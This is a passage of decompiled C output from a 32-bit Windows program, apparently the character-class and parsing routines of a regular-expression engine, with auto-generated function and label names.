  void *pvStack_10;
  undefined *puStack_c;
  undefined4 uStack_8;
  
  uStack_8 = 0xffffffff;
  puStack_c = &LAB_00415db6;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  FUN_0040c1aa(acStack_1c,param_2,param_3);
  uStack_8 = 0;
  this = (void *)FUN_0040507f(*param_3,0x38);
  uStack_8 = CONCAT31(uStack_8._1_3_,1);
  if (this == (void *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    puStack_14 = &stack0xffffffd0;
    uVar2 = extraout_ECX;
    uVar3 = extraout_ECX;
    FUN_0040bad5(&stack0xffffffd0,acStack_1c);
    puVar1 = FUN_0040c200(this,param_1,(char)uVar2,uVar3,param_3);
  }
  uStack_8 = 0xffffffff;
  FUN_00406ed3(acStack_1c);
  ExceptionList = pvStack_10;
  return puVar1;
}



undefined4 * FUN_004091c8(void)

{
  void *pvVar1;
  undefined4 *puVar2;
  undefined4 extraout_ECX;
  int unaff_EBP;
  undefined4 uVar3;
  undefined4 uVar4;
  void **ppvVar5;
  
  ppvVar5 = *(void ***)(unaff_EBP + 0x10);
  FUN_0040c1aa((void *)(unaff_EBP + -0x18),*(int *)(unaff_EBP + 0xc),ppvVar5);
  pvVar1 = *ppvVar5;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  pvVar1 = (void *)FUN_0040507f(pvVar1,0x38);
  *(void **)(unaff_EBP + 0xc) = pvVar1;
  *(undefined *)(unaff_EBP + -4) = 1;
  if (pvVar1 == (void *)0x0) {
    puVar2 = (undefined4 *)0x0;
  }
  else {
    *(undefined **)(unaff_EBP + -0x10) = &stack0xffffffe0;
    uVar3 = extraout_ECX;
    uVar4 = extraout_ECX;
    FUN_0040bad5(&stack0xffffffe0,(undefined *)(unaff_EBP + -0x18));
    puVar2 = FUN_0040c200(pvVar1,*(undefined4 *)(unaff_EBP + 8),(char)uVar3,uVar4,ppvVar5);
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_00406ed3((char *)(unaff_EBP + -0x18));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return puVar2;
}



undefined4 * __cdecl FUN_00409233(uint param_1,void **param_2)

{
  undefined4 *puVar1;
  
  if ((param_1 & 4) == 0) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      *puVar1 = &LAB_00417bc0;
      return puVar1;
    }
  }
  else if ((param_1 & 4) == 4) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      *puVar1 = &DAT_00417bf4;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



undefined4 * __cdecl FUN_0040927c(uint param_1,void **param_2)

{
  undefined4 *puVar1;
  
  if ((param_1 & 4) == 0) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      *puVar1 = &DAT_00417c28;
      return puVar1;
    }
  }
  else if ((param_1 & 4) == 4) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      *puVar1 = &DAT_00417c5c;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



void __cdecl FUN_004092c5(int param_1,ushort **param_2,ushort *param_3,uint *param_4)

{
  byte *pbVar1;
  int iVar2;
  bool bVar3;
  byte bVar4;
  byte bVar5;
  wctype_t wVar6;
  ushort uVar7;
  wctype_t wVar8;
  int iVar9;
  undefined3 extraout_var;
  undefined *puVar10;
  undefined4 *puVar11;
  undefined2 extraout_var_00;
  undefined2 extraout_var_01;
  undefined2 extraout_var_02;
  undefined2 extraout_var_03;
  undefined2 extraout_var_04;
  undefined2 extraout_var_05;
  undefined2 extraout_var_06;
  undefined2 extraout_var_07;
  undefined2 extraout_var_08;
  undefined2 extraout_var_09;
  undefined2 extraout_var_10;
  uint *puVar12;
  undefined2 extraout_var_11;
  undefined2 extraout_var_12;
  undefined4 extraout_ECX;
  void *pvVar13;
  ushort *puVar14;
  undefined2 uVar15;
  uint uVar16;
  undefined4 uVar17;
  uint uStack_4c;
  uint uStack_48;
  uint uStack_44;
  uint uStack_40;
  uint uStack_3c;
  uint uStack_38;
  uint uStack_34;
  uint uStack_30;
  uint uStack_2c;
  uint uStack_28;
  uint uStack_24;
  uint uStack_20;
  uint uStack_1c;
  uint uStack_18;
  undefined4 local_14;
  ushort *local_10;
  ushort *local_c;
  undefined4 local_8;
  
  iVar2 = param_1;
  local_10 = *param_2;
  local_14 = CONCAT31(local_14._1_3_,(*param_4 & 0x100) == 0x100);
  if ((param_3 != local_10) &&
     (iVar9 = FUN_0040bd91((char **)&local_10,(char *)param_3), iVar9 == 0x2d)) {
    *(undefined *)(*(int *)(param_1 + 4) + 4) = 1;
    *param_2 = local_10;
  }
  param_1 = 0;
  bVar3 = false;
  puVar14 = *param_2;
  local_8 = CONCAT31(local_8._1_3_,'\x01' - (((byte)*param_4 & 1) != 1));
  FUN_004133fe((int)puVar14,(int)param_3);
  local_c = (ushort *)FUN_0040bd91((char **)param_2,(char *)param_3);
  do {
    FUN_004133fe((int)*param_2,(int)param_3);
    bVar5 = (byte)param_1;
    if (local_c == (ushort *)0x2f) {
      if (!bVar3) goto LAB_00409413;
      local_c = *param_2;
      bVar3 = false;
      iVar9 = FUN_0040bd91((char **)param_2,(char *)param_3);
      uVar17 = local_8;
      if (iVar9 == 0) {
LAB_004093ef:
        uVar16 = CONCAT31((int3)((uint)extraout_ECX >> 8),*(undefined *)*param_2);
        *param_2 = (ushort *)((int)*param_2 + 1);
LAB_004093bd:
        pvVar13 = *(void **)(iVar2 + 4);
LAB_004093c3:
        FUN_0040bc3e(pvVar13,bVar5,uVar16,(char)uVar17);
      }
      else {
        if (iVar9 == 0x2d) {
LAB_004093ea:
          *param_2 = local_c;
          goto LAB_004093ef;
        }
        if (iVar9 == 0x2e) {
          pvVar13 = *(void **)(iVar2 + 4);
          bVar4 = FUN_0041346f((byte **)param_2,(int)param_3,(char)local_14);
          uVar16 = CONCAT31(extraout_var,bVar4);
          goto LAB_004093c3;
        }
        if (iVar9 == 0x2f) goto LAB_004093ea;
        if (iVar9 == 0x30) {
          uVar16 = 8;
          goto LAB_004093bd;
        }
        *param_2 = puVar14;
        FUN_00414933(*(void **)(iVar2 + 4),bVar5,(char)local_8);
        bVar5 = *(byte *)*param_2;
        *param_2 = (ushort *)((int)*param_2 + 1);
        FUN_00414933(*(void **)(iVar2 + 4),bVar5,(char)local_8);
      }
      goto LAB_00409745;
    }
    if (bVar3) {
      FUN_00414933(*(void **)(iVar2 + 4),bVar5,(char)local_8);
    }
LAB_00409413:
    bVar3 = false;
    if ((int)local_c < 0x39) {
      if (local_c == (ushort *)0x38) {
        puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
        uVar7 = FUN_00409822();
        goto LAB_00409725;
      }
      if ((int)local_c < 0x30) {
        if (local_c != (ushort *)0x2f) {
          if ((int)local_c < 0x18) {
            if (local_c == (ushort *)0x17) {
              pvVar13 = *(void **)(iVar2 + 4);
              puVar10 = FUN_004080d8();
            }
            else if (local_c == (ushort *)0x13) {
              pvVar13 = *(void **)(iVar2 + 4);
              puVar10 = FUN_0040811c();
            }
            else if (local_c == (ushort *)0x14) {
              pvVar13 = *(void **)(iVar2 + 4);
              puVar10 = FUN_004081d0();
            }
            else if (local_c == (ushort *)0x15) {
              pvVar13 = *(void **)(iVar2 + 4);
              puVar10 = FUN_00408154();
            }
            else {
              if (local_c != (ushort *)0x16) goto LAB_00409737;
              pvVar13 = *(void **)(iVar2 + 4);
              puVar10 = FUN_00408208();
            }
          }
          else {
            if (local_c != (ushort *)0x18) {
              if (local_c != (ushort *)0x2d) {
                if (local_c != (ushort *)0x2e) goto LAB_00409737;
                puVar11 = FUN_00409cbb(CONCAT31((int3)((uint)*param_2 >> 8),*(undefined *)*param_2),
                                       param_4);
                if (puVar11 == (undefined4 *)0x0) {
                  bVar5 = FUN_0041346f((byte **)param_2,(int)param_3,(char)local_14);
                  param_1 = (int)bVar5;
                  goto LAB_00409741;
                }
                FUN_0040bb1b(*(void **)(iVar2 + 4),(int)puVar11);
                *param_2 = (ushort *)((int)*param_2 + 1);
                goto LAB_00409745;
              }
              goto LAB_004094f3;
            }
            pvVar13 = *(void **)(iVar2 + 4);
            puVar10 = FUN_0040818c();
          }
          FUN_0040bb1b(pvVar13,(int)puVar10);
          goto LAB_00409745;
        }
LAB_004094f3:
        *param_2 = puVar14;
        param_1 = (int)*(byte *)puVar14;
        *param_2 = (ushort *)((int)puVar14 + 1);
        goto LAB_00409741;
      }
      switch(local_c) {
      case (ushort *)0x30:
        param_1 = 8;
        goto LAB_00409741;
      case (ushort *)0x31:
        goto LAB_004094f3;
      case (ushort *)0x32:
        puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
        uVar7 = FUN_004097f9();
        goto LAB_00409725;
      case (ushort *)0x33:
        wVar6 = FUN_004097f9();
        uStack_18 = CONCAT22(extraout_var_00,wVar6);
        puVar12 = &uStack_18;
        break;
      case (ushort *)0x34:
        puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
        uVar7 = FUN_00407684();
        goto LAB_00409725;
      case (ushort *)0x35:
        wVar6 = FUN_00407684();
        uStack_1c = CONCAT22(extraout_var_01,wVar6);
        puVar12 = &uStack_1c;
        break;
      case (ushort *)0x36:
        pbVar1 = (byte *)(*(int *)(iVar2 + 4) + 0x26);
        *pbVar1 = *pbVar1 | 0x40;
        goto LAB_00409745;
      case (ushort *)0x37:
        uStack_20 = 0x40;
        puVar12 = &uStack_20;
        break;
      default:
        goto LAB_00409737;
      }
      goto code_r0x004096ff;
    }
    if (0x10 < (int)local_c - 0x39U) {
LAB_00409737:
      param_1 = (int)*(byte *)*param_2;
      *param_2 = (ushort *)((int)*param_2 + 1);
LAB_00409741:
      bVar3 = true;
      goto LAB_00409745;
    }
    uVar15 = (undefined2)((uint)puVar14 >> 0x10);
    switch(local_c) {
    case (ushort *)0x39:
      wVar6 = FUN_00409822();
      uStack_24 = CONCAT22(extraout_var_02,wVar6);
      puVar12 = &uStack_24;
      break;
    case (ushort *)0x3a:
      puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
      uVar7 = FUN_004076ad();
      goto LAB_00409725;
    case (ushort *)0x3b:
      wVar6 = FUN_004076ad();
      uStack_28 = CONCAT22(extraout_var_03,wVar6);
      puVar12 = &uStack_28;
      break;
    case (ushort *)0x3c:
      puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
      uVar7 = FUN_0040984b();
      goto LAB_00409725;
    case (ushort *)0x3d:
      wVar6 = FUN_0040984b();
      uStack_2c = CONCAT22(extraout_var_04,wVar6);
      puVar12 = &uStack_2c;
      break;
    case (ushort *)0x3e:
      if (((byte)*param_4 & 1) == 1) {
        local_c = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
        wVar6 = FUN_004098ef();
        wVar8 = FUN_00409874();
        uVar7 = wVar6 | wVar8;
code_r0x004096cc:
        *local_c = *local_c | uVar7;
        goto LAB_00409745;
      }
      puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
      uVar7 = FUN_00409874();
      goto LAB_00409725;
    case (ushort *)0x3f:
      if (((byte)*param_4 & 1) == 1) {
        wVar6 = FUN_004098ef();
        wVar8 = FUN_00409874();
        uStack_30 = CONCAT22(uVar15,wVar6) | CONCAT22(extraout_var_05,wVar8);
        puVar12 = &uStack_30;
      }
      else {
        wVar6 = FUN_00409874();
        uStack_34 = CONCAT22(extraout_var_06,wVar6);
        puVar12 = &uStack_34;
      }
      break;
    case (ushort *)0x40:
      puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
      uVar7 = FUN_0040989d();
      goto LAB_00409725;
    case (ushort *)0x41:
      wVar6 = FUN_0040989d();
      uStack_38 = CONCAT22(extraout_var_07,wVar6);
      puVar12 = &uStack_38;
      break;
    case (ushort *)0x42:
      puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
      uVar7 = FUN_004098c6();
      goto LAB_00409725;
    case (ushort *)0x43:
      wVar6 = FUN_004098c6();
      uStack_3c = CONCAT22(extraout_var_08,wVar6);
      puVar12 = &uStack_3c;
      break;
    case (ushort *)0x44:
      puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
      uVar7 = FUN_004076d6();
      goto LAB_00409725;
    case (ushort *)0x45:
      wVar6 = FUN_004076d6();
      uStack_40 = CONCAT22(extraout_var_09,wVar6);
      puVar12 = &uStack_40;
      break;
    case (ushort *)0x46:
      if (((byte)*param_4 & 1) == 1) {
        local_c = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
        wVar6 = FUN_004098ef();
        wVar8 = FUN_00409874();
        uVar7 = wVar6 | wVar8;
        goto code_r0x004096cc;
      }
      puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
      uVar7 = FUN_004098ef();
      goto LAB_00409725;
    case (ushort *)0x47:
      if (((byte)*param_4 & 1) == 1) {
        wVar6 = FUN_004098ef();
        wVar8 = FUN_00409874();
        uStack_44 = CONCAT22(uVar15,wVar6) | CONCAT22(extraout_var_10,wVar8);
        puVar12 = &uStack_44;
      }
      else {
        wVar6 = FUN_004098ef();
        uStack_48 = CONCAT22(extraout_var_11,wVar6);
        puVar12 = &uStack_48;
      }
      break;
    case (ushort *)0x48:
      puVar14 = (ushort *)(*(int *)(iVar2 + 4) + 0x26);
      uVar7 = FUN_00409918();
LAB_00409725:
      *puVar14 = *puVar14 | uVar7;
      goto LAB_00409745;
    case (ushort *)0x49:
      wVar6 = FUN_00409918();
      uStack_4c = CONCAT22(extraout_var_12,wVar6);
      puVar12 = &uStack_4c;
    }
code_r0x004096ff:
    FUN_0040bd58((void *)(*(int *)(iVar2 + 4) + 0x30),(undefined2 *)puVar12);
LAB_00409745:
    puVar14 = *param_2;
    FUN_004133fe((int)puVar14,(int)param_3);
    local_c = (ushort *)FUN_0040bd91((char **)param_2,(char *)param_3);
    if (local_c == (ushort *)0x31) {
      if (bVar3) {
        FUN_00414933(*(void **)(iVar2 + 4),(byte)param_1,(char)local_8);
      }
      iVar2 = *(int *)(iVar2 + 4);
      FUN_0040df58(iVar2);
      *(undefined2 *)(iVar2 + 0x26) = 0;
      return;
    }
  } while( true );
}



wctype_t FUN_004097f9(void)

{
  if ((DAT_0041ca0c & 1) == 0) {
    DAT_0041ca0c = DAT_0041ca0c | 1;
    DAT_0041ca0e = wctype(s_alnum_0041c494);
  }
  return DAT_0041ca0e;
}



wctype_t FUN_00409822(void)

{
  if ((DAT_0041ca08 & 1) == 0) {
    DAT_0041ca08 = DAT_0041ca08 | 1;
    DAT_0041ca0a = wctype(s_cntrl_0041c49c);
  }
  return DAT_0041ca0a;
}



wctype_t FUN_0040984b(void)

{
  if ((DAT_0041ca04 & 1) == 0) {
    DAT_0041ca04 = DAT_0041ca04 | 1;
    DAT_0041ca06 = wctype(s_graph_0041c4a4);
  }
  return DAT_0041ca06;
}



wctype_t FUN_00409874(void)

{
  if ((DAT_0041ca00 & 1) == 0) {
    DAT_0041ca00 = DAT_0041ca00 | 1;
    DAT_0041ca02 = wctype(s_lower_0041c4ac);
  }
  return DAT_0041ca02;
}



wctype_t FUN_0040989d(void)

{
  if ((DAT_0041c9fc & 1) == 0) {
    DAT_0041c9fc = DAT_0041c9fc | 1;
    DAT_0041c9fe = wctype(s_print_0041c4b4);
  }
  return DAT_0041c9fe;
}



wctype_t FUN_004098c6(void)

{
  if ((DAT_0041c9f8 & 1) == 0) {
    DAT_0041c9f8 = DAT_0041c9f8 | 1;
    DAT_0041c9fa = wctype(s_punct_0041c4bc);
  }
  return DAT_0041c9fa;
}



wctype_t FUN_004098ef(void)

{
  if ((DAT_0041c9f4 & 1) == 0) {
    DAT_0041c9f4 = DAT_0041c9f4 | 1;
    DAT_0041c9f6 = wctype(s_upper_0041c4c4);
  }
  return DAT_0041c9f6;
}



wctype_t FUN_00409918(void)

{
  if ((DAT_0041c9f0 & 1) == 0) {
    DAT_0041c9f0 = DAT_0041c9f0 | 1;
    DAT_0041c9f2 = wctype(s_xdigit_0041c4cc);
  }
  return DAT_0041c9f2;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall FUN_00409941(void *this,int param_1,uint param_2,void **param_3)

{
  char cVar1;
  void *pvVar2;
  undefined4 *puVar3;
  char local_18;
  undefined3 uStack_17;
  int local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415de4;
  local_10 = ExceptionList;
  puVar3 = (undefined4 *)0x0;
  local_18 = param_1 != 0;
  local_14 = param_1;
  uStack_17 = (undefined3)((uint)this >> 8);
  local_8 = 0;
  if ((param_2 & 1) == 0) {
    ExceptionList = &local_10;
    pvVar2 = (void *)FUN_0040507f(*param_3,0x10);
    cVar1 = local_18;
    local_8 = CONCAT31(local_8._1_3_,1);
    if (pvVar2 != (void *)0x0) {
      local_18 = '\0';
      puVar3 = FUN_0040c600(pvVar2,cVar1,local_14);
      goto LAB_004099df;
    }
  }
  else {
    ExceptionList = &local_10;
    if ((param_2 & 1) != 1) goto LAB_004099df;
    ExceptionList = &local_10;
    pvVar2 = (void *)FUN_0040507f(*param_3,0x10);
    cVar1 = local_18;
    local_8 = CONCAT31(local_8._1_3_,2);
    if (pvVar2 != (void *)0x0) {
      local_18 = '\0';
      puVar3 = FUN_0040c79b(pvVar2,cVar1,local_14);
      goto LAB_004099df;
    }
  }
  puVar3 = (undefined4 *)0x0;
LAB_004099df:
  local_8 = 0xffffffff;
  FUN_0040c5ed(&local_18);
  ExceptionList = local_10;
  return puVar3;
}



undefined4 * __cdecl FUN_004099fb(uint param_1,void **param_2)

{
  undefined4 *puVar1;
  
  if ((param_1 & 8) == 0) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      *puVar1 = &LAB_00417c90;
      return puVar1;
    }
  }
  else if ((param_1 & 8) == 8) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      *puVar1 = &LAB_00417cc4;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __cdecl FUN_00409a43(char param_1,undefined4 param_2,void **param_3)

{
  undefined4 *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415e0c;
  local_10 = ExceptionList;
  if (param_1 == '\0') {
    ExceptionList = &local_10;
    puVar1 = (undefined4 *)FUN_0040507f(*param_3,0xc);
    local_8 = 1;
    if (puVar1 != (undefined4 *)0x0) {
      puVar1 = FUN_0040ccc0(puVar1);
      ExceptionList = local_10;
      return puVar1;
    }
  }
  else {
    ExceptionList = &local_10;
    puVar1 = (undefined4 *)FUN_0040507f(*param_3,0xc);
    local_8 = 0;
    if (puVar1 != (undefined4 *)0x0) {
      puVar1 = FUN_0040cbb3(puVar1);
      ExceptionList = local_10;
      return puVar1;
    }
  }
  ExceptionList = local_10;
  return (undefined4 *)0x0;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __cdecl FUN_00409a9d(undefined4 param_1,void **param_2)

{
  undefined4 *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415e26;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  puVar1 = (undefined4 *)FUN_0040507f(*param_2,0xc);
  local_8 = 0;
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    puVar1 = FUN_0040cdcd(puVar1);
  }
  ExceptionList = local_10;
  return puVar1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __cdecl FUN_00409ad6(undefined4 param_1,void **param_2)

{
  undefined4 *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415e3e;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  puVar1 = (undefined4 *)FUN_0040507f(*param_2,0xc);
  local_8 = 0;
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    puVar1 = FUN_0040ceda(puVar1);
  }
  ExceptionList = local_10;
  return puVar1;
}



undefined4 * __cdecl FUN_00409b0f(undefined4 param_1,uint param_2,void **param_3)

{
  undefined4 *puVar1;
  
  if ((param_2 & 1) == 0) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_3,0xc);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[2] = param_1;
      *puVar1 = &DAT_00417cf8;
      return puVar1;
    }
  }
  else if ((param_2 & 1) == 1) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_3,0xc);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[2] = param_1;
      *puVar1 = &DAT_00417d2c;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



undefined4 * __cdecl FUN_00409b68(undefined4 param_1,void **param_2)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
  if (puVar1 != (undefined4 *)0x0) {
    puVar1[1] = 0;
    *puVar1 = &LAB_00417bc0;
    return puVar1;
  }
  return (undefined4 *)0x0;
}



undefined4 * __cdecl FUN_00409b87(undefined4 param_1,void **param_2)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
  if (puVar1 != (undefined4 *)0x0) {
    puVar1[1] = 0;
    *puVar1 = &DAT_00417c28;
    return puVar1;
  }
  return (undefined4 *)0x0;
}



undefined4 * __cdecl FUN_00409ba6(undefined4 param_1,void **param_2)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_0040507f(*param_2,8);
  if (puVar1 != (undefined4 *)0x0) {
    puVar1[1] = 0;
    *puVar1 = &DAT_00417d60;
    return puVar1;
  }
  return (undefined4 *)0x0;
}



undefined4 * __cdecl FUN_00409bc5(char param_1,uint param_2,void **param_3)

{
  int iVar1;
  undefined4 *puVar2;
  char cStack00000006;
  undefined uStack00000007;
  
  if ((param_2 & 1) == 0) {
    puVar2 = (undefined4 *)FUN_0040507f(*param_3,9);
    if (puVar2 != (undefined4 *)0x0) {
      puVar2[1] = 0;
      *(char *)(puVar2 + 2) = param_1;
LAB_00409c55:
      *puVar2 = &DAT_00417d94;
      return puVar2;
    }
  }
  else if ((param_2 & 1) == 1) {
    iVar1 = tolower((int)param_1);
    _cStack00000006 = CONCAT11(uStack00000007,(char)iVar1);
    iVar1 = toupper((int)param_1);
    _cStack00000006 = CONCAT11((char)iVar1,cStack00000006);
    if (cStack00000006 == (char)iVar1) {
      puVar2 = (undefined4 *)FUN_0040507f(*param_3,9);
      if (puVar2 != (undefined4 *)0x0) {
        puVar2[1] = 0;
        *(char *)(puVar2 + 2) = param_1;
        goto LAB_00409c55;
      }
    }
    else {
      puVar2 = (undefined4 *)FUN_0040507f(*param_3,10);
      if (puVar2 != (undefined4 *)0x0) {
        puVar2[1] = 0;
        *(undefined2 *)(puVar2 + 2) = _cStack00000006;
        *puVar2 = &DAT_00417dc8;
        return puVar2;
      }
    }
  }
  return (undefined4 *)0x0;
}



undefined4 * __cdecl FUN_00409c62(undefined4 param_1,uint param_2,void **param_3)

{
  undefined4 *puVar1;
  
  if ((param_2 & 1) == 0) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_3,0xc);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[2] = param_1;
      *puVar1 = &DAT_00417dfc;
      return puVar1;
    }
  }
  else if ((param_2 & 1) == 1) {
    puVar1 = (undefined4 *)FUN_0040507f(*param_3,0xc);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[2] = param_1;
      *puVar1 = &DAT_00417e30;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __cdecl FUN_00409cbb(undefined4 param_1,uint *param_2)

{
  int **ppiVar1;
  undefined uVar2;
  undefined *this;
  undefined4 *puVar3;
  void *this_00;
  byte bVar4;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar5;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_4c [4];
  ushort *local_48;
  int local_44;
  int aiStack_3c [2];
  char local_34 [4];
  int local_30;
  char local_2c [4];
  undefined4 *local_28;
  int *local_24;
  ushort *local_20;
  undefined *local_1c;
  undefined4 *local_18;
  undefined local_11;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415e69;
  local_10 = ExceptionList;
  local_18 = (undefined4 *)0x0;
  ExceptionList = &local_10;
  this = FUN_00409e44();
  local_11 = (undefined)param_1;
  local_1c = this;
  puVar3 = (undefined4 *)FUN_0040df3e(this,&local_24,(undefined4 *)&local_11);
  ppiVar1 = (int **)*puVar3;
  if (*(int ***)(this + 4) != ppiVar1) {
    bVar4 = 1 - (((byte)*param_2 & 1) != 1);
    local_18 = *(undefined4 **)((uint)bVar4 * 4 + 0x1d + (int)ppiVar1);
    if (local_18 == (undefined4 *)0x0) {
      local_4c[0] = param_1._3_1_;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_4c,false);
      local_8 = 0;
      FUN_0040baf0(local_4c,(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                             *)((int)ppiVar1 + 0xd));
      local_8 = 1;
      FUN_0040a05c(local_1c,&local_24,ppiVar1);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (local_4c);
      local_20 = local_48;
      local_28 = (undefined4 *)operator_new(0x37);
      if (local_28 == (undefined4 *)0x0) {
        local_28 = (undefined4 *)0x0;
      }
      else {
        FUN_0040888b(local_28);
        *local_28 = &DAT_00417e64;
      }
      local_2c[0] = local_28 != (undefined4 *)0x0;
      local_30 = aiStack_3c[bVar4 == 0];
      local_34[0] = local_30 != 0;
      local_8._0_1_ = 3;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (local_4c);
      FUN_004135d1((int)local_2c,&local_20,
                   (ushort *)(-(uint)(local_48 != (ushort *)0x0) & local_44 + (int)local_48),param_2
                  );
      local_18 = local_28;
      aiStack_3c[bVar4] = (int)local_28;
      uVar2 = (undefined)param_1;
      param_1 = CONCAT13(uVar2,(undefined3)param_1);
      pbVar5 = local_4c;
      this_00 = (void *)FUN_0040de99(local_1c,(undefined *)((int)&param_1 + 3));
      FUN_0040baf0(this_00,pbVar5);
      local_2c[0] = '\0';
      local_34[0] = '\0';
      local_8._0_1_ = 2;
      FUN_0040c5ed(local_34);
      local_8 = CONCAT31(local_8._1_3_,1);
      FUN_0040c5ed(local_2c);
      local_8 = 0xffffffff;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_4c,true);
    }
  }
  ExceptionList = local_10;
  return local_18;
}



undefined * FUN_00409e44(void)

{
  if ((DAT_0041c9d4 & 1) == 0) {
    DAT_0041c9d4 = DAT_0041c9d4 | 1;
    FUN_00409e79(&DAT_0041c9e0);
    FUN_0041536c((_onexit_t)&LAB_00409e6f);
  }
  return &DAT_0041c9e0;
}



undefined * __fastcall FUN_00409e79(undefined *param_1)

{
  undefined local_5;
  
  local_5 = (undefined)((uint)param_1 >> 0x18);
  param_1[8] = 0;
  *param_1 = local_5;
  param_1[1] = local_5;
  FUN_0040a3a0((int)param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00409e99(void *param_1)

{
  void **ppvVar1;
  int *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415e7c;
  local_10 = ExceptionList;
  local_8 = 0;
  local_14 = (int *)**(int **)((int)param_1 + 4);
  ExceptionList = &local_10;
  ppvVar1 = &local_10;
  if (*(int **)((int)param_1 + 4) != local_14) {
    do {
      FUN_00409ff7((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   ((int)local_14 + 0xd));
      FUN_0040a42b((int *)&local_14);
      ppvVar1 = (void **)ExceptionList;
    } while ((int *)*(int *)((int)param_1 + 4) != local_14);
  }
  ExceptionList = ppvVar1;
  local_8 = 0xffffffff;
  FUN_00409ef3(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00409ef3(void *param_1)

{
  void *local_8;
  
  local_8 = param_1;
  FUN_00409f4d(param_1,&local_8,(int **)**(int ***)((int)param_1 + 4),*(int ***)((int)param_1 + 4));
  operator_delete(*(void **)((int)param_1 + 4));
  *(undefined4 *)((int)param_1 + 4) = 0;
  *(undefined4 *)((int)param_1 + 0xc) = 0;
  std::_Lockit::_Lockit((_Lockit *)&local_8);
  _DAT_0041c9b0 = _DAT_0041c9b0 + -1;
  if (_DAT_0041c9b0 == 0) {
    operator_delete(DAT_0041c9ac);
    DAT_0041c9ac = (void *)0x0;
  }
  std::_Lockit::~_Lockit((_Lockit *)&local_8);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog
